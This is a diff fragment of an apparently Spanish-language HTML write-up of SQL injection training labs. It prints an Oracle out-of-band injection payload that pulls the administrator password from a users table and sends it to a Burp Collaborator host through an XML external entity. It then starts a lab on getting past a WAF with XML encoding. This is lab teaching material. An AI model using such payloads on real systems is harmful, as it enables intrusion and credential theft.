 <p><code>TrackingId = xxxxxxxxx'||(SELECT EXTRACTVALUE(xmltype('&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;!DOCTYPE root [ &lt;!ENTITY % remote SYSTEM &quot;http://'||(select password form users where username='administrator')||'.BURP-COLLABORATOR-SUBDOMAIN/&quot;&gt; %remote;]&gt;'),'/l') FROM dual-- -</code></p>
 <p>Lo cual se representaria así:</p>
 <p><strong>&lsquo;resultadoDeLacontraseña&rsquo;.XXXXXXXXXXXX.oastify.com</strong></p>
-<div class="table-wrapper"><table>
-<thead>
-<tr>
-<th style="text-align:center">LAB 17: SQL injection with filter bypass via XML enconding</th>
-</tr>
-</thead>
-</table></div>
+<h2 id="lab-17-sql-injection-with-filter-bypass-via-xml-enconding">LAB 17: SQL injection with filter bypass via XML enconding</h2>
 <p>El objetivo de este laboratorio es bypassear el WAF que nos bloquea a la hora de hacer la inyección. Aquí la vulnerabilidad se encuentra en &lsquo;stock check feature&rsquo;.
 Para ese laboratorio vamos a necesitar el &lsquo;HackVertor&rsquo;, para ellos nos vamos a la pestaña extender y ahí buscamos esta extensión del burpsuite.</p>
 <p>En el burpsuite veremos esta estructura XML:</p>
